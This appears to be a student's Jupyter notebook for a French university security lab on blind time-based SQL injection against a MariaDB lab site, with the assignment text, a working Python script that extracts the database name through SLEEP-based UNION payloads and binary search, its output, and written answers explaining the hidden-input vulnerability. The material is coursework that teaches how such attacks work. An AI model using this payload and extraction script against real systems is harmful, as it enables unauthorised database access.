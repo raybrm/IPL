{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ipl I317B Sécurité : labos\n",
    "## Projet 1 : exploitation SQL à l'aveugle"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Pour ce premier projet (qui originellement était le dernier exercice de la semaine 3), vous allez procéder à des injections à l'aveugle. En effet, la page suicitant notre intérêt pour ce projet ne contient pas grand chose à part un bouton ... mais elle est injectable (promis) !\n",
    "\n",
    "http://labosecuipl.alwaysdata.net/20/s03/ex2/\n",
    "\n",
    "\n",
    "Cette fois-ci, le moteur de base de donnée présent derrière ce site n'est plus du sqlite mais du MariaDB. Votre objectif pour ce projet est de récupérer le nom de la base de donnée."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "1. Premièrement, vous devrez analyser ce site pour trouver où faire votre injection. Comme l'indique le nom de ce projet, votre injection sera à l'aveugle, vous ne devez donc pas vous attendre à percevoir le moindre résultat pour celle-ci, aucune valeur présente sur le site ne dépend de la réusite de votre injection (par exemple: oui, la couleur du titre est *vraiment* aléatoire).  \n",
    "   Pour vous aider dans votre démarche, voici quelques *gros* indices :\n",
    "  - MariaDB dispose d'une fonction sleep ( https://mariadb.com/kb/en/sleep/ ) qui va faire \"dormir\" le code un certain nombre de seconde. La base de donnée mettra donc plus de temps avant de retourner un résultat.\n",
    "  - SQL, comme d'autres langages, fait une évaluation paresseuse (lazy) des conditions. Celles-ci sont évaluée de gauche à droite et si la logique booleen le permet, les parties inutiles sont ignorées.  \n",
    "    > L'exemple suivant est en python mais le comportement SQL est le même :\n",
    "    > - `if False and 1/0:` ne créera pas d'exception malgré la présence d'une division par zéro.\n",
    "    > - `if True and 1/0:` créera une exception `ZeroDivisionError`.\n",
    "    >  \n",
    "    > En effet, dans le premier cas, le résultat de `Faux ET ?` sera toujours faux ([logique booléen](https://fr.wikipedia.org/wiki/Alg%C3%A8bre_de_Boole_(logique)#Conjonction)), il n'est donc pas nécessaire d'évaluer la suite de l'expression et python ne \"voit\" donc même pas la division par zéro.\n",
    "    > \n",
    "    > Dans la deuxième expression `True ET ?`, toute l'expression dépend de ce qui se trouve après le `ET` et donc la suite de l'expression doit être évaluée.\n",
    "\n",
    "2. Une fois l'injection trouvée et fonctionnelle, vous devrez coder un programme qui recherchera le nom de la base de donnée (voir: https://mariadb.com/kb/en/database/ ).  \n",
    "   Au vue du type d'attaque que vous allez mener (ralenti par les `sleep`) et le nombre d'étudiant (pauvre serveur), je vous demande de coder intelligemment :\n",
    "  - Un des buts évalué de ce projet est de réduire le nombre de requêtes nécessaire pour obtenir le résultat par exemple avec une [recherche dichotomique](https://fr.wikipedia.org/wiki/Recherche_dichotomique).\n",
    "  - Un temps de sleep entre 2 et 5 secondes devrait être suffisant dans la majorité des cas (à moins que vous n'ayez une connection internet particulièrement instable).\n",
    "  - (...)\n",
    "\n",
    "  Afin d'aiguiller votre recherche, nous partons du postula que le nom de la base de donnée à trouver ne comprend que des charactères repris dans `[a-z0-9]` ainsi que le tiret `-` et le tiret du bas `_`. (Attention le tiret du bas à une [valeur particulière](https://www.w3schools.com/sql/sql_wildcards.asp) dans le `LIKE` sql.)\n",
    "3. En plus du code du point précédent, vous rédigerez quelques lignes de texte pour décrire :\n",
    "  - la localisation de la vulnérabilité et la requête SQL supposée derrière (La question classique \"Qu'est-ce qui tourne derrière ?\").\n",
    "  - le format de votre injection.\n",
    "  - d'éventuelles difficultées rencontrer pendant ce projet.\n",
    "  \n",
    "  Ce texte peut être présenté dans une cellule de type Markdown de votre jupyter notebook."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Le format de remise préféré est un jupyter notebook mais vous pouvez également fournir un fichier \"*.py*\" plus un *pdf* pour la partie textuelle.\n",
    "\n",
    "La date de remise sur moodle est le dimanche 25 octobre à 23H59."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "\"\"\"\n",
    "Fait une requete post pour voir si le caractère est {=, > ,<} au caractère dans la base de donnée à la position donnée\n",
    "\"\"\"\n",
    "def requestPost(caractere, position, comparateur):\n",
    "    timeBeforeRequest = time.time()\n",
    "    sqli = \" '' UNION SELECT SLEEP(3) WHERE SUBSTRING(DATABASE(), %s, 1) %s '%s' ;--\" %(\n",
    "        position, comparateur, caractere)\n",
    "    page = requests.post(\n",
    "        \"http://labosecuipl.alwaysdata.net/20/s03/ex2/\",\n",
    "        data={\n",
    "            \"id\": sqli}\n",
    "    )\n",
    "    timeAfterRequest = time.time()\n",
    "    if (timeAfterRequest - timeBeforeRequest > 3):\n",
    "        return True\n",
    "    else:\n",
    "        return False\n",
    "    \n",
    "#requestPost('l', str(1), '=')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "\"\"\"\n",
    "Renvoie la position; 'a' représente le début de la liste et 'b' la fin de la liste, 'm' le milieu\n",
    "\"\"\"\n",
    "def recherche_dichotomique(liste_de_donnee, position, a, b):\n",
    "    if b >= a:\n",
    "        m = (a+b)//2\n",
    "        if (requestPost(liste_de_donnee[m], position, '=')):\n",
    "            return m\n",
    "        elif (requestPost(liste_de_donnee[m], position, '<')): # le char est plus grand\n",
    "            return recherche_dichotomique(liste_de_donnee, position, a, m-1)\n",
    "        #elif (requestPost(liste_de_donnee[m], position, '>')):\n",
    "        else:\n",
    "            return recherche_dichotomique(liste_de_donnee, position, m+1, b)\n",
    "    else:\n",
    "        return -1\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "en cours...\n",
      "labosecuipl_p01_blind\n",
      "\n",
      "Fin ! temps mis:  182.41846561431885\n",
      "résultat : labosecuipl_p01_blind\n"
     ]
    }
   ],
   "source": [
    "# du plus petit char au plus grand\n",
    "dictionnaire = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f',\n",
    "                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'x', 'w',\n",
    "                'y', 'z', '-', '_']\n",
    "resultat = \"\"\n",
    "position = 1\n",
    "\n",
    "debut = time.time()\n",
    "print(\"en cours...\")\n",
    "while 1:\n",
    "    res = recherche_dichotomique(dictionnaire, str(position), 0, len(dictionnaire)-1)\n",
    "    if (res != -1):\n",
    "        resultat += dictionnaire[res]\n",
    "        position += 1\n",
    "        print(dictionnaire[res], end='')\n",
    "    else:\n",
    "        break\n",
    "\n",
    "fin = time.time()\n",
    "print(\"\\n\")\n",
    "print(\"Fin ! temps mis: \", fin - debut)\n",
    "print(\"résultat :\", resultat)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Question 1 :\n",
    "\n",
    "La vulnérabilité se trouve dans un input qui est caché, c'est-à-dire qu'on ne le voit pas sur la page. Pour le voir il suffit d'inspecter le code source de la page et on aperçois bien l'input caché. L'input reçoit une valeur random, un id. Quand j'analyse les requêtes réseau, je remarque qu'il y a une requête POST qui est effectuée et que l'id qui est dans l'input est envoyé avec pour effectuer une requête SQL à une base de donnée. La requête à la base de donnée que j'ai déduis est la suivante :\n",
    "\n",
    "    SELECT <???> FROM <???> WHERE id=<id>\n",
    "    "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Question 2:\n",
    "\n",
    "Après avoir identifier la vulnérabilité, j'ai pu essayer plusieurs injection SQL avant de trouver la bonne. A savoir que la page n'affiche rien de la base de données du coup il n'y a rien de visuel pour nous dire si l'injection SQL a fonctionnée. Mais il existe une fonction en SQL qui permet de faire dormir le code : sleep(x). \n",
    "J'ai utiliser cela pour voir si mon injection était bonne. \n",
    "Le format de mon injection SQL est la suivante\n",
    "    \n",
    "    \" '' UNION SELECT SLEEP(3) WHERE SUBSTRING(DATABASE(), <position caractère>, 1) < '>' ou '<' ou '=' >            '<caractère>' ;--\"\n",
    "    \n",
    "ce qui donnera le tout attaché: \n",
    "   \n",
    "   SELECT <???> \n",
    "   FROM <???> \n",
    "   WHERE id= '   ' \n",
    "   UNION \n",
    "   SELECT SLEEP(3) \n",
    "   WHERE SUBSTRING(DATABASE(), <position caractère>, 1) < '>' ou '<' ou '='> '<caractère>';--\n",
    "   \n",
    "L'id peut être aussi un nombre, n'importe lequel, ça n'a pas d'importance même si le premier select ne renvoie pas de résultat le deuxième sera fait sans problème. Ce qui compte c'est le matching du nombre de colonne. Ici il y en a une de part et d'autre."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Question 3:\n",
    "\n",
    "Je n'ai pas rencontré personellement de problème durant ce projet. Une fois la bonne injection SQL trouvée il était assé simple de trouver le nom de la base de donnée."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
